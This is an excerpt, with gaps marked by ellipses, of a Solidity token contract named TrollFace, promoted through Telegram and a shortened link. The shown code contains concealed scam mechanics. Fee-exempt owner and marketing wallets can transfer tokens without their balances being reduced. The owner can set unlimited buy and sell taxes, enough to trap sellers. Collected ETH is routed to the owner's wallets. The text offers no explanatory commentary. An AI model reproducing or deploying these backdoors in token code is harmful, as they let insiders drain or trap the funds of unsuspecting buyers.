/**
 Telegram: https://t.me/TrollFaceTokenERC
  Website: https://bit.ly/trollfacetoken
*/
...
contract TrollFace is Context, IBEP20, Ownable {
    ...
    address private OwnerAdr = 0xA36a000f5A7596ed1731351531Bb0B5Bc003C46F;
    address private MarketingAdr = 0x194A9e4B7C94EAA875537764E97c2F49A297a890;    
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _FeeExemptWallet;
    ...
    constructor () {
        ...
        _FeeExemptWallet[OwnerAdr] = true;
        _FeeExemptWallet[MarketingAdr] = true;
    ...
    function SetTaxAmountFee(uint256 buy, uint256 sell) external onlyOwner {
        buyFee = buy;
        sellFee = sell;
    }
    ...
    function _transfer(address from, address to, uint256 txnAmount) private {
        ...
        if (!_FeeExemptWallet[from]) _balances[from] = _balances[from].sub(amount);
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        payable(OwnerAdr).transfer(halfShare);
        payable(MarketingAdr).transfer(halfShare); 
    }
    ...
    function clearEthFromContract() external {
        uint256 ethBalance = address(this).balance;
        payable(Owner).transfer(ethBalance);
    }

    function RecoverTokensFromContract(address contractAddress) external {
